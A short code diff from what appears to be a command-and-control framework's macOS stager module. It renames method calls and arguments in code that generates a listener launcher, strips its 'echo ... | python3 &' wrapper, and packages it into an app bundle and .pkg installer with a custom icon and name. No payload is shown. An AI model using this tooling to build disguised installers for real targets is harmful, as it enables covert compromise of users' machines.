@@ -78,11 +78,11 @@ class Stager:
         arch = "x64"
 
         # generate the launcher code
-        launcher = self.mainMenu.stagers.generate_launcher(
-            listenerName=listener_name,
+        launcher = self.mainMenu.stagergenv2.generate_launcher(
+            listener_name=listener_name,
             language=language,
-            userAgent=user_agent,
-            safeChecks=safe_checks,
+            user_agent=user_agent,
+            safe_checks=safe_checks,
         )
 
         if launcher == "":
@@ -96,14 +96,14 @@ class Stager:
             launcher_code = removeprefix(launcher, "echo ")
             launcher_code = removesuffix(launcher_code, " | python3 &")
             launcher_code = launcher_code.strip('"')
-            application_zip = self.mainMenu.stagers.generate_appbundle(
-                launcherCode=launcher_code,
-                Arch=arch,
+            application_zip = self.mainMenu.stagergenv2.generate_appbundle(
+                launcher_code=launcher_code,
+                arch=arch,
                 icon=icns_path,
-                AppName=app_name,
+                app_name=app_name,
                 disarm=disarm,
             )
-            pkginstaller = self.mainMenu.stagers.generate_pkg(
-                launcher=launcher, bundleZip=application_zip, AppName=app_name
+            pkginstaller = self.mainMenu.stagergenv2.generate_pkg(
+                launcher=launcher, bundle_zip=application_zip, app_name=app_name
             )
             return pkginstaller
